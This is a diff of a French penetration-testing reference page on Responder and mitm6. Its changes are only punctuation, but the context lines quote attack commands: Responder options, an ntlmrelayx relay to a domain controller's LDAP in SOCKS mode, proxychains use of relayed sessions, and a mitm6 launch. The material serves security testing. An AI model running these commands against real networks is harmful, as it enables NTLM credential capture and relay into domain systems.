@@ -1126,7 +1126,7 @@
   <a href="#mode-socks-utilisation-via-proxychains" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Mode SOCKS — Utilisation via proxychains
+        Mode SOCKS : Utilisation via proxychains
       
     </span>
   </a>
@@ -1575,7 +1575,7 @@
   
 
 
-<h1 id="responder-mitm6-reference-complete">Responder &amp; mitm6 — Référence complète<a class="headerlink" href="#responder-mitm6-reference-complete" title="Permanent link">&para;</a></h1>
+<h1 id="responder-mitm6-reference-complete">Responder &amp; mitm6 : Référence complète<a class="headerlink" href="#responder-mitm6-reference-complete" title="Permanent link">&para;</a></h1>
 <hr />
 <h2 id="responder">Responder<a class="headerlink" href="#responder" title="Permanent link">&para;</a></h2>
 <h3 id="le-concept">Le concept<a class="headerlink" href="#le-concept" title="Permanent link">&para;</a></h3>
@@ -1602,7 +1602,7 @@
 </span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="c1"># -r    Répondre aux requêtes NBT-NS pour noms NetBIOS</span>
 </span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="c1"># -d    Répondre aux requêtes DHCP</span>
 </span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="c1"># -w    Démarrer le serveur WPAD (proxy auto-discovery)</span>
-</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="c1"># -A    Mode analyse (passive — ne répond pas)</span>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="c1"># -A    Mode analyse (passive : ne répond pas)</span>
 </span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="c1"># -v    Mode verbeux</span>
 </span></code></pre></div>
 <h3 id="logs-et-hashes-captures">Logs et hashes capturés<a class="headerlink" href="#logs-et-hashes-captures" title="Permanent link">&para;</a></h3>
@@ -1661,7 +1661,7 @@
 </span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>ntlmrelayx.py<span class="w"> </span>-6<span class="w"> </span>-socks<span class="w"> </span>-t<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-smb2support<span class="w"> </span><span class="se">\</span>
 </span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="w">              </span>-tf<span class="w"> </span>~/certif/targets_relay.txt
 </span></code></pre></div>
-<h3 id="mode-socks-utilisation-via-proxychains">Mode SOCKS — Utilisation via proxychains<a class="headerlink" href="#mode-socks-utilisation-via-proxychains" title="Permanent link">&para;</a></h3>
+<h3 id="mode-socks-utilisation-via-proxychains">Mode SOCKS : Utilisation via proxychains<a class="headerlink" href="#mode-socks-utilisation-via-proxychains" title="Permanent link">&para;</a></h3>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Dans ntlmrelayx, taper &quot;socks&quot; pour voir les relais actifs</span>
 </span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>&gt;<span class="w"> </span>socks
 </span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>Protocol<span class="w">  </span>Target<span class="w">         </span>Username<span class="w">                        </span>AdminStatus<span class="w">  </span>Port
@@ -1687,7 +1687,7 @@
 </span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>mitm6 peut rediriger les authentifications NTLM vers ntlmrelayx
 </span></code></pre></div>
 <h3 id="lancement">Lancement<a class="headerlink" href="#lancement" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Terminal 1 — mitm6</span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Terminal 1 : mitm6</span>
 </span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>sudo<span class="w"> </span>mitm6<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN_FQDN</span><span class="w"> </span>-i<span class="w"> </span><span class="nv">$IFACE</span>
 </span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
 </span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="c1"># Options :</span>
